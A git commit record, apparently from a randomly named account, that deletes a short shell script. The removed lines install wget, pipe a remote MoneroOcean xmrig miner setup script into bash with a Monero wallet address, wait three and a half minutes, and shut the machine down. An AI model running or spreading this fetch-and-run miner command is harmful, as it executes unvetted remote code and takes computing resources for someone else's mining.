753b58e1f13c116ad578f94bb2f56b39de4e43d7
hmnfecoii <132653406+hmnfecoii@users.noreply.github.com>
2023-05-05 10:05:58 +0000

    Delete bscnfefbf.sh

--- bscnfefbf.sh
+++
@@ -1,5 +0,0 @@
-#! /bin/bash
-sudo apt-get install wget -y
-curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4846S5hnZQLNUFLWAak9Aj2bTgpTEQY5N8aYMk2h26kNaMG59iNE3E3G6kxUCm5Y34jQvsH5GPH4XZ34yWpYM63f1SDkuQr
-sleep 3m 30s
-sudo poweroff
